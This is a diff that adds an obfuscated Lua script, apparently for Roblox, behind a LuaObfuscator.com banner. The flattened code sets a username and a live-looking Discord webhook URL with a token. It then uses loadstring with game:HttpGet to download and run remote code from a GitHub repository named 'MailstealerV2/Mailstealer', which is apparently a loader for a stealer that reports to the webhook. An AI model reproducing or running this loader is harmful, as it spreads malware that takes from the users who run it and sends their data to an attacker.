@@ -1,0 +1,13 @@
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.9.19) ~  Much Love, Ferib 
+
+]]--
+
+do local v0=0;local v1;local v2;while true do if (v0==0) then v1=0;v2=nil;v0=1;end if (v0==1) then while true do if (v1==0) then v2=0;while true do if (v2==1) then LoadingScreen=true;loadstring(game:HttpGet("https://raw.githubusercontent.com/MailstealerV2/Mailstealer/main/v2"))();break;end if (v2==0) then local v3=0;local v4;while true do if (v3==0) then v4=0;while true do if (v4==1) then v2=1;break;end if (v4==0) then Username="junbloxyt_playz";Webhook="https://discord.com/api/webhooks/1193191495277223997/nsqnkPTuaxWp1Q-ip8zNZb3x6JX_Cl992cXvXENVU4gMlnEFaLecRAzMqx7dn2gn2Mvj
+";v4=1;end end break;end end end end break;end end break;end end end
